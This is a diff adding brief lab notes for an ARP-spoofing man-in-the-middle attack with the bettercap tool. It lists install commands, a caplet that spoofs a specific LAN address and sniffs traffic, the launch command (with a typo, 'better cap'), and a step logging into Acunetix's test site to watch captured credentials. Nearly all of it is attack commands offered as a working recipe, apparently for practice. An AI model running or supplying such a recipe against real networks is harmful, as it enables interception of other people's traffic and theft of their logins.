@@ -1,0 +1,32 @@
+ARP Spoofing 
+    
+sudo apt install libnetfilter-queue-dev libpcap-dev
+
+better cap link : https://github.com/bettercap/bettercap/releases/download/v2.28/bettercap_linux_amd64_v2.28.zip
+
+mkdir bettercap
+
+cd bettercap
+
+wget --no-check-certificate https://github.com/bettercap/bettercap/releases/download/v2.28/bettercap_linux_amd64_v2.28.zip
+
+sudo unzip bettercap_linux_amd64_v2.28.zip
+
+./bettercap --version
+
+
+sudo nano spoof.cap 
+	  net.probe on
+        set arp.spoof.fullduplex true
+        set arp.spoof.targets 192.168.80.160
+        arp.spoof on
+        set net.sniff.local true
+        net.sniff on
+
+
+sudo ./better cap -iface ens33 -caplet spoof.cap
+
+
+go to acunetix acuart login 
+
+	fill user details and see deb all details are we can see
